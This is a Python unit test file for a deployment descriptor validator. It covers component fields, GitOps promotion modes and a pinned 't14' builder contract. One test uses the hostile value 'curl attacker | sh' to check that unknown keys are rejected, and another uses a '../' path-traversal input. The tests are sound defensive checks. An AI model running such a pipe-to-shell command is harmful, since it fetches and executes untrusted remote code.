from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

import yaml

from scripts.validate_descriptor import InvalidDescriptor, load_and_validate, matrix


VALID = {
    "schemaVersion": 1,
    "application": "example-app",
    "components": [{
        "name": "api", "image": "registry.lan.kyo.ninja/example/api",
        "context": "src", "dockerfile": "src/Dockerfile", "workload": "example-api",
        "container": "api", "rolloutProfile": "bluegreen"
    }],
    "gitops": {
        "repository": "JustShinobi/k3s-gitops-prod", "baseBranch": "main",
        "stagingBranch": "deploy/stg", "productionBranch": "main",
        "stagingPath": "applications/example/overlays/stg",
        "productionPath": "applications/example/overlays/prod",
        "stagingApplication": "stg-example", "productionApplication": "prd-example"
    },
}


T14_CONTRACT = {
    "enabled": True,
    "builderKeyId": "t14-builder-2026-09",
    "builderTargets": [
        "baseline",
        "proposed",
        "proposed-without-relations",
        "proposed-without-t06_readers",
        "proposed-without-t07_probes",
        "proposed-without-t09_planning",
    ],
    "gitopsPath": "clusters/prod/workloads/ninjasre-t14",
    "gitopsApplication": "stg-ninjasre-t14",
    "imageComponent": "api",
    "sharedComponents": ["proxy"],
    "baselineSourceSha": "a" * 40,
    "baselineWorkflowSha": "b" * 40,
    "baselineRepository": "JustShinobi/ninjasre-t14-baseline",
    "baselineRunId": "123456789",
    "baselineArtifactName": "t14-baseline-release",
}


class DescriptorTests(unittest.TestCase):
    def write(self, root: Path, value: object) -> Path:
        path = root / "application.yaml"
        path.write_text(yaml.safe_dump(value), encoding="utf-8")
        return path

    def test_valid_descriptor_renders_bounded_matrix(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            path = self.write(root, VALID)
            data = load_and_validate(path, check_files=False)
            self.assertEqual(matrix(data)["include"][0]["platforms"], "linux/amd64")
            self.assertFalse(matrix(data)["include"][0]["t14_only"])

    def test_accepts_a_t14_only_component(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["t14Only"] = True
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertTrue(matrix(data)["include"][0]["t14_only"])

    def test_rejects_a_non_boolean_t14_only_component(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["t14Only"] = "true"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "t14Only must be a boolean"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_allows_repository_root_as_context(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["context"] = "."
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["components"][0]["context"], ".")

    def test_rejects_unknown_key(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["command"] = "curl attacker | sh"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "unknown keys"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_path_traversal(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["dockerfile"] = "../Dockerfile"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "must not be absolute"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_unapproved_platform(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["platforms"] = ["linux/s390x"]
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "unsupported platform"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_accepts_chart_values_image_promotion(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["gitops"]["imagePromotion"] = "chart-values"
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["gitops"]["imagePromotion"], "chart-values")

    def test_allows_a_non_t14_staging_branch_that_does_not_match_the_trunk(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["gitops"]["stagingBranch"], "deploy/stg")

    def test_accepts_production_only_promotion(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["gitops"] = {
            "repository": "JustShinobi/k3s-gitops-prod",
            "baseBranch": "main",
            "productionBranch": "main",
            "productionPath": "applications/example/overlays/prod",
            "productionApplication": "prd-example",
            "promotionMode": "production-only",
        }
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["gitops"]["promotionMode"], "production-only")

    def test_rejects_staging_keys_for_production_only(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["gitops"]["promotionMode"] = "production-only"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "staging keys"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_unknown_image_promotion(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["gitops"]["imagePromotion"] = "arbitrary"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "imagePromotion"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_allows_shared_image_repository(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "admin", "workload": "example-admin",
            "container": "admin"
        })
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(len(data["components"]), 2)

    def test_accepts_the_closed_t14_builder_contract(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "proxy", "workload": "example-proxy",
            "container": "proxy",
        })
        value["gitops"]["stagingBranch"] = "main"
        value["t14"] = yaml.safe_load(yaml.safe_dump(T14_CONTRACT))
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["t14"]["imageComponent"], "api")

    def test_enabled_t14_exports_the_workflow_revision(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "proxy", "workload": "example-proxy",
            "container": "proxy",
        })
        for component, container in (
            ("t14-observer", "observer"),
            ("t14-readonly-executor", "t14-readonly-executor"),
        ):
            value["components"].append({
                **value["components"][0],
                "name": component,
                "workload": component,
                "container": container,
                "t14Only": True,
            })
        value["gitops"]["stagingBranch"] = "main"
        value["t14"] = yaml.safe_load(yaml.safe_dump(T14_CONTRACT))
        value["t14"]["sharedComponents"] = [
            "proxy", "t14-observer", "t14-readonly-executor"
        ]
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            descriptor = self.write(root, value)
            output = root / "github-output"
            result = subprocess.run(
                [
                    sys.executable,
                    str(Path(__file__).parents[1] / "scripts/validate_descriptor.py"),
                    str(descriptor),
                    "--no-check-files",
                    "--github-output",
                    str(output),
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            outputs = dict(
                line.split("=", 1) for line in output.read_text(encoding="utf-8").splitlines()
            )
            self.assertEqual(outputs["t14_baseline_workflow_sha"], T14_CONTRACT["baselineWorkflowSha"])
            self.assertEqual(outputs["t14_shared_components"], "proxy,t14-observer,t14-readonly-executor")
            self.assertEqual(outputs["t14_only_components"], "t14-observer,t14-readonly-executor")

    def test_rejects_an_enabled_t14_staging_branch_that_does_not_match_the_trunk(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "proxy", "workload": "example-proxy",
            "container": "proxy",
        })
        value["t14"] = yaml.safe_load(yaml.safe_dump(T14_CONTRACT))
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "stagingBranch.*baseBranch"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_an_incomplete_t14_target_set(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "proxy", "workload": "example-proxy",
            "container": "proxy",
        })
        value["t14"] = {
            "enabled": True,
            "builderKeyId": "t14-builder-2026-09",
            "builderTargets": ["baseline"],
            "gitopsPath": "clusters/prod/workloads/ninjasre-t14",
            "gitopsApplication": "stg-ninjasre-t14",
            "imageComponent": "api",
            "sharedComponents": ["proxy"],
            "baselineSourceSha": "a" * 40,
            "baselineWorkflowSha": "b" * 40,
            "baselineRepository": "JustShinobi/ninjasre-t14-baseline",
            "baselineRunId": "123456789",
            "baselineArtifactName": "t14-baseline-release",
        }
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "six approved targets"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_accepts_a_blocked_t14_until_historical_baseline_is_attested(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["t14"] = {
            "enabled": False,
            "blockReason": "historical-baseline-not-attested",
        }
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertFalse(data["t14"]["enabled"])

    def test_rejects_an_enabled_t14_without_a_historical_baseline_sha(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["t14"] = {
            "enabled": True,
            "builderKeyId": "t14-builder-2026-09",
            "builderTargets": [
                "baseline",
                "proposed",
                "proposed-without-relations",
                "proposed-without-t06_readers",
                "proposed-without-t07_probes",
                "proposed-without-t09_planning",
            ],
            "gitopsPath": "clusters/prod/workloads/ninjasre-t14",
            "gitopsApplication": "stg-ninjasre-t14",
            "imageComponent": "api",
            "sharedComponents": ["proxy"],
        }
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "missing keys.*baselineSourceSha"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_an_unpinned_historical_baseline_run(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "proxy", "workload": "example-proxy",
            "container": "proxy",
        })
        value["t14"] = {
            "enabled": True,
            "builderKeyId": "t14-builder-2026-09",
            "builderTargets": [
                "baseline",
                "proposed",
                "proposed-without-relations",
                "proposed-without-t06_readers",
                "proposed-without-t07_probes",
                "proposed-without-t09_planning",
            ],
            "gitopsPath": "clusters/prod/workloads/ninjasre-t14",
            "gitopsApplication": "stg-ninjasre-t14",
            "imageComponent": "api",
            "sharedComponents": ["proxy"],
            "baselineSourceSha": "a" * 40,
            "baselineWorkflowSha": "b" * 40,
            "baselineRepository": "JustShinobi/ninjasre-t14-baseline",
            "baselineRunId": "latest",
            "baselineArtifactName": "t14-baseline-release",
        }
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "baselineRunId"):
                load_and_validate(self.write(Path(directory), value), check_files=False)


if __name__ == "__main__":
    unittest.main()
